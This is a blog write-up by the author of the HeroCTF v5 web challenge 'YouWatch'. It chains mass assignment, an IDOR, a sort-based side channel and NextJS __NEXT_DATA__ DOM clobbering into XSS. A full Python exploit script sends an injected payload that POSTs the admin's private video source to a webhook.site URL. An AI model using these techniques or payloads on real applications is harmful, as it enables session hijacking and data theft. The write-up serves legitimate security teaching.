---
source: kevin-mizu
source_url: https://mizu.re/post/youwatch
title: "YouWatch | mizu.re"
description: "YouWatch"
---

_keyboard\_arrow\_up_

title: YouWatch

date: May 15, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [HeroCTF\_v5](https://mizu.re/tag/HeroCTF_v5) [MyChallenges](https://mizu.re/tag/MyChallenges)

# YouWatch

![logo.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/logo.png)

* * *

Difficulty: 500 points \| 2 solves

Description: A new video upload platform opens its doors! It's promising and a lot of investors are part of the project!

The admin of the platform has uploaded a presentation video which presents a lot of tips and advices to start and progress quickly on the platform.

Unfortunately, you are not an investor...

The admin of the platform is very trendy, and the code of the platform is open-source.

Find a way to watch the admin's video!

Sources: [youwatch.zip](https://mizu.re/articles/writeups/heroctf_2023/youwatch/youwatch.zip)

Authors: [Worty](https://twitter.com/_Worty) & [Me :p](https://twitter.com/kevin_mizu)

* * *

- [🕵️ Recon](https://mizu.re/post/youwatch#%EF%B8%8F-recon)
- [🤖 Finding gadgets](https://mizu.re/post/youwatch#-finding-gadgets)
  - [Sort misconfiguration](https://mizu.re/post/youwatch#sort-misconfiguration)
  - [Mass Assignment](https://mizu.re/post/youwatch#mass-assignment)
  - [IDOR](https://mizu.re/post/youwatch#idor)
- [📺 Side Channel](https://mizu.re/post/youwatch#-side-channel)
- [⭐ Messages component review](https://mizu.re/post/youwatch#-messages-component-review)
- [🍪 NextJS DOM Clobbering abuse](https://mizu.re/post/youwatch#-nextjs-dom-clobbering-abuse)
- [💥 Chain everything together](https://mizu.re/post/youwatch#-chain-everything-together)
- [🚩 Retrieve the flag](https://mizu.re/post/youwatch#-retrieve-the-flag)

## 🕵️ Recon

This challenge is maybe the hardest I have made with my friend [Worty](https://twitter.com/_Worty) until today, I hope you will enjoy this writeup.

For this challenge, we have to following configuration:

- \[Port 8000\] Frontend: NextJs
- \[port 3000\] Backend API: Express
- \[Not exposed\] Database: MySQL

The following GIF will give you an overview of the web application:

![youwatch.gif](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/youwatch.gif)

As we can see, the web application allows to:

- Create an account / Log into it
- Search for public videos
- Upload and manage public / private videos (private chatId and videoId can only be get by the video owner)
- Watch a video (private video can only be viewed by the video owner)

In addition, we know that the admin access each minute his private video:

```js
async function visitPage()
{
    var bot_user = process.env.BOT_USER;
    var bot_pass = process.env.BOT_PASSWORD;
    var frontend = process.env.FRONTEND_BOT
    const admin_video_id = "cb13a41b-04a1-47aa-8687-885fe74a1062"; // not the same on remote :)
    const admin_chat_id = "2e6e4787-6722-46da-83f9-8d38a4c7a922"; // not the same on remote :)

    // Retracted

    await page.goto(`${frontend}/video/view/${admin_video_id}`)
    await Message.destroy({
        where: {
            chatId: admin_chat_id
        }
    })
    browser.close();
    return;
}

cron.schedule("*/1 * * * *", visitPage);
```

So, for this challenge, we have to find a way to send a message to the admin's private chat and steal the video content.

## 🤖 Finding gadgets

In this section, we are going to list all gadgets that has to be found to craft the final exploit.

### Sort misconfiguration

Even if it is not visible from the frontend, the API /api/videos/getVideos has a lot of additional parameters. Thanks to them we can:

- Access the name of any private video.
- Sort by any value present in the SQL response query even if it is not selected.

I added comments on the below snippet:

- backend/routes/videoRouter.js -\> /getVideos

```js
let sort_by = "name";
let order = "ASC";
let type = "public";
let name = "";

if (req.query.sortBy != undefined) {
    if (checkType(req.query.sortBy)) {
        sort_by = req.query.sortBy; // Change sortBy here
    } else {
        res.status(400).json( {"code": 400, "error": "sortBy is not a string"});
        res.end();
    }
}

// Retracted

if (req.query.type != undefined) {
    if (checkType(req.query.type) && ["public","private"].includes(req.query.type)) {
        type = req.query.type // Change type here
    }
}

// Retracted

if (type == "public") {
    // Retracted
} else {
    videos = await Video.findAll({
        include:[{\
            model: User,\
            attributes: ["pseudo"],\
            as: 'users'\
        }],
        attributes: ["name"], // We can see the name of all private videos!
        order: [\
            [sort_by, order]  // Here we can sort by any column!\
        ],
        where:{
            isPrivate: 1,
            name: {
                [Op.like]: `%${name}%`
            }
        }
    });
}

if (videos.length > 0) {
    res.status(200).json( {"code": 200, "data" :videos} )
} else {
    res.status(200).json( {"code": 200, "data": "No videos found"} )
}
```

### Mass Assignment

When updating a video, there is no check about what attribute can be edited. It is possible to update any of the following values:

- name
- userId
- chatId
- isPrivate

This is really interesting because, when creating a video, most of them are set randomly. Therefore, we can now control arbitrary attributes! 🔥

I added comments on the below snippet:

- backend/routes/videoRouter.js -\> /updateVideo

```js
// Retracted, but you must own the video to edit it

// Impossible to update pathVideo
if(req.body.pathVideo != undefined) {
    res.status(403).json( {"code": 403, "error": "You can't update the path to your video."})
}

// The body is used to update the video -> allows to update any attribute not filtred
const res_update = await Video.update(req.body, {
    where: {
        id: req.body.id
    }
})
```

### IDOR

On /api/chats/sendMessage there is no check about the video's owner. So, we can send a message to any chat if we have his videoId!

- backend/routes/chatRouter.js -\> /sendMessage

```js
await Message.create({
    id: v4(),
    userId: req.decoded.id,
    content: req.body.content,
    chatId: req.body.chatId
})
res.status(200).json({"code": 200, "ok": "Message sent !"})
```

## 📺 Side Channel

Thanks to the previously found gadgets, we have now the ability to leak the admin's chatid 🎉

Thanks to the sort misconfiguration and the mass assignment, we can:

1. Create a private video
2. Change its chatId by a
3. Search with type=private and sortBy=chatId

Thus, if the admin's private chatId start with a letter which is under a in the ASCII table, our video will be below at the opposite, it will be above! 🔥

For example:

- chatId=0

```sh
curl -s -X PUT -H "Content-Type: application/json" -b "token={YOUR-TOKEN}"  -d '{"id": "{YOUR-VIDEO-ID}", "name": "Private video", "isPrivate":1, "chatId": "0"}' http://172.17.0.1:3000/api/videos/updateVideo

curl -s -X GET -b "token={YOUR-TOKEN}"  "http://172.17.0.1:3000/api/videos/getVideos?name=&type=private&sortBy=chatId" | jq
```

![side_channel1.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/side_channel1.png)

- chatId=z

![side_channel1.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/side_channel2.png)

As we can see, for chatId=0, our video is above the admin video while for chatId=z it is below. Thus, the first letter of the private admin chatId is between 0 and z in the ASCII table!

## ⭐ Messages component review

Now that we can send any message to the private admin chat thanks to the side channel attack and the IDOR on api/chats/postMessage, we need to find a way to still the video content.

Looking into the frontend source code, we can find the following:

- frontend/components/message.tsx

```js
export default function Message(props: ContainerProps) {
    const msg = parseMarkdown(props.content);

    return (
    <div className="mb-20">
        <FontAwesomeIcon icon={faUser} className="mr-10" /> <span dangerouslySetInnerHTML={{ __html: `${props.pseudo} ${msg}` }}></span>
    </div>
    );
}
```

As we can see, the message component allows MarkDown and are rendered using dangerouslySetInnerHTML which allows HTML!

![md.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/md.png)

Unfortunately, trying basic HTML injection / XSS it doesn't works.

![no_xss.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/no_xss.png)

To understand what happens here, we need to dig into the parseMarkdown function:

- frontend/helpers/utils/parseMarkdown.ts

```js
import sanitizeHTML from '../security/sanitizeHTML';

export default function parseMarkdown(markdown: string) {
    const parser = require('markdown-it')().use(require('markdown-it-attrs'), {
        allowedAttributes: [ 'id', 'class', 'name' ]
    }).disable('emphasis');
    var unsafe_html = parser.render(markdown);

    return sanitizeHTML(unsafe_html);
}
```

- frontend/helpers/security/sanitizeHTML.ts

```js
import santize from 'sanitize-html';

export default function sanitizeHTML(html) {
    return santize(html, {
        allowedTags: ['h1', 'h2', 'h3', 'h4', 'p', 'div', 'img', 'em', 'a', 'i', 'b'],
        allowedAttributes: {
            '*': [ 'id', 'class', 'name' ],
            'img': [ 'src' ],
            'a': [ 'href' ]
        }
    })
}
```

As we can see, [markdown-it](https://github.com/markdown-it/markdown-it) is used to render markdown. This library santizes HTML by default and render only MarkDown values to prevent XSS. In addition, the [markdown-it-attrs](https://github.com/arve0/markdown-it-attrs) library is used to allow to add attributes to the rendered MarkDown value. Finaly, to ensure that no XSS is generated by both libraries, [sanitize-html](https://github.com/apostrophecms/sanitize-html).

From the above audit, we can conclude that sanitization is pretty strong 😂

Therefore, there is something really important! Even if it is not possible to trigger an XSS directly from the above configuration, it is possible to inject arbitrary attribute which can be pretty useful for DOM Clobbering attacks!

## 🍪 NextJS DOM Clobbering abuse

At this point, if we found a way to trigger an XSS thanks to the attribute injection, we would be able the steal the admin private video!

When looking for DOM Clobbering gadget, there is a lot a way to start: reviewing JS files, looking for interesting HTML structure, using tools like DOM Invaders>... In our case, we are going to simply take a look to the DOM:

- /video/view/{YOUR-VIDEO-ID}

```html
<html>
    <head>
        <!-- Retracted -->
    </head>
    <body>
        <!-- Retracted -->
        <script id="__NEXT_DATA__" type="application/json">
            {"props":{"pageProps":{"pseudo":"worty_mizu","email":"worty_mizu@gmail.com","name":"Private video","videoId":"68664b07-294f-4a95-bfb1-24a2855e4258","videoData":"...","chatId":"d41f28f5-4c54-432a-9222-ac2161c909dc","chat":[{"content":"\u003ch1\u003eHELLO\u003c/h1\u003e\n\u003cimg src=x onerror=alert()\u003e","users":{"pseudo":"worty_mizu"}}]},"__N_SSP":true},"page":"/video/view/[id]","query":{"id":"68664b07-294f-4a95-bfb1-24a2855e4258"},"buildId":"CZ8IYPA3CrGB26R1ig03G","isFallback":false,"gssp":true,"scriptLoader":[]}
        </script>
        <!-- Retracted -->
    </body>
</html>
```

If you look closely, you should see the above script tag which is used to provide Server Side props, buildId... information to the Client Side in order to render the page. What is interesent with this tag? Is has a NextJs id 🔥

If we try to clobber it, it gives us:

```md
# HELLO {#__NEXT_DATA__}
```

![dom_error.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/dom_error.png)

If we dig into the error: ( [permalink](https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/index.tsx#L201) of the vulnerable code)

```js
void 0 === e && (e = {}),
a = JSON.parse(document.getElementById("__NEXT_DATA__").textContent),
window.__NEXT_DATA__ = a,
```

As we can see, the \_\_NEXT\_DATA\_\_ script content is retrieved using document.getElementById which get only the first occurrence! Because the original one is present at the end of the DOM, we can clobber it and change the JSON content 🎉

Now that we have a gadget, we need to find a way to abuse it to get an XSS. From the initial value, we can see an interesting attribute: scriptLoader 👀

- [\[nextjs\] /packages/next/src/client/index.tsx -> initialData.scriptLoader](https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/index.tsx#L269)

```js
if (initialData.scriptLoader) {
    const { initScriptLoader } = require('./script')
    initScriptLoader(initialData.scriptLoader)
}
```

- [\[nextjs\] /packages/next/src/client/script.tsx -> initScriptLoader](https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL165C1-L168C2)

```js
export function initScriptLoader(scriptLoaderItems: ScriptProps[]) {
    scriptLoaderItems.forEach(handleClientScriptLoad)
    addBeforeInteractiveToCache()
}
```

- [\[nextjs\] /packages/next/src/client/script.tsx -> handleClientScriptLoad](https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL133C1-L142C2)

```js
export function handleClientScriptLoad(props: ScriptProps) {
    const { strategy = 'afterInteractive' } = props
    if (strategy === 'lazyOnload') {
        window.addEventListener('load', () => {
            requestIdleCallback(() => loadScript(props))
        })
    } else {
        loadScript(props)
    }
}
```

- [\[nextjs\] /packages/next/src/client/script.tsx -> loadScript](https://github.com/vercel/next.js/blob/afddb6ebdade616cdd7780273be4cd28d4509890/packages/next/src/client/script.tsx#LL36C1-L131C2)

```js
const loadScript = (props: ScriptProps): void => {
    // Retracted

    const cacheKey = id || src

    // Retracted

    if (src) {
        el.src = src
        ScriptCache.set(src, loadPromise)
    }

    // Retracted

    document.body.appendChild(el)
}
```

Thanks to the above call tree, we can understand that scriptLoader as the following structure:

```json
{
    "scriptLoader": {
        "src": "data:,alert()"
    }
}
```

Using it on our own chat and we get an XSS! 🎉

```md
## {"scriptLoader": [{"src": "data:,alert()"}]} {#__NEXT_DATA__}
```

![xss.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/xss.png)

## 💥 Chain everything together

The below script chain everything described before, change the following before executing it:

- exfilt\_url by your own
- create a user exploit:exploit
- change oracle\_video\` id (with a private one)

```py
import requests, sys

class SideChannel():

    def __init__(self):
        self.alpha = "-0123456789abcdefg" #we put a char after f because if there's a f in the admin's chatid the side channel wont see it
        self.size = 36
        self.S = S = requests.Session()
        self.base_url = base_url = "http://localhost:3000"
        self.exfilt_url = "https://webhook.site/42bde4c8-a8dd-4fb0-81bf-1f00fe8fdce1"
        self.videos = []
        self.oracle_video = {
            "id": "fb92ed38-a06d-47d2-af99-7d7ef8effe29"
        }
        self.admin_chat_id = ""
        self.last_upper = "admin"
        self.current_char = ""
        self.old_char = ""
        self.debug = 0
        self.payload = '## {"scriptLoader": [{"src": "data:,fetch(\'%s\', {method: \'POST\',body: document.getElementsByTagName(\'source\')[0].src})"}]} {#__NEXT_DATA__}' % self.exfilt_url

    def modify_video(self, char):
        to_send = {
            "id": self.oracle_video['id'],
            "name": "oracle",
            "isPrivate": 1,
            "chatId": self.admin_chat_id+char
        }
        self.current_char = char
        self.S.put(f"{self.base_url}/api/videos/updateVideo",json=to_send)

    def call_oracle(self):
        res = self.S.get(f"{self.base_url}/api/videos/getVideos",params={"type":"private","sortBy":"chatId","orderBy":"DESC"})
        current_upper = res.json()['data'][0]['users']['pseudo']
        if current_upper != self.last_upper:
            self.admin_chat_id += self.old_char
            self.last_upper = "admin"
            return True
        else:
            return False

    def get_videos(self):
        self.videos = self.S.get(f"{self.base_url}/api/videos/myVideos").json()
        if self.videos.get('data') and len(self.videos['data']) > 0:
            self.oracle_video = self.videos['data'][0]

    def login_and_upload(self):
        if(self.S.post(f"{self.base_url}/api/login",json={"pseudo":"exploit","password":"exploit"}).status_code == 200):
            print("[LOGIN OK]")
            my_video = self.S.get(f"{self.base_url}/api/videos/myVideos").json()
            if len(my_video["data"]) == 0:
                if(self.S.post(f"{self.base_url}/api/videos/uploadVideo",json={"name":"super video !","isPrivate":1,"video":"YQ=="}).status_code == 200):
                    print("[UPLOAD OK]")
                else:
                    print("UPLOAD ERROR")
        else:
            print("[LOGIN ERROR]")

    def send_evil_msg(self):
        if(self.S.post(f"{self.base_url}/api/chats/sendMessage",json={"chatId":self.admin_chat_id,"content":self.payload}).status_code == 200):
            print("[PAYLOAD SENT]")
        else:
            print("[PAYLOAD ERROR]")

    def run(self):
        self.login_and_upload()
        self.get_videos()
        self.modify_video("") #put the chat id to "" so the admin will be upper
        self.call_oracle()
        for i in range(36):
            for a in self.alpha:
                self.modify_video(a)
                if(self.call_oracle()):
                    if(self.debug):
                        print(self.admin_chat_id)
                    break
                else:
                    self.old_char = a
        print("[GET CHATID OF ADMIN]")
        self.send_evil_msg()

side_channel = SideChannel()
side_channel.run()
```

![exploit.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/exploit.png)

![exfilt.png](https://mizu.re/articles/writeups/heroctf_2023/youwatch/images/exfilt.png)

## 🚩 Retrieve the flag

Decoding the video and we get:

Flag: HERO{N3XT\_0DAY\_L34K\_4DM1N _V1D3O_!!} 🎉

[_keyboard\_arrow\_left_ Infinite Mario](https://mizu.re/post/infinite-mario)

[Simple Notes _keyboard\_arrow\_right_](https://mizu.re/post/simple-notes)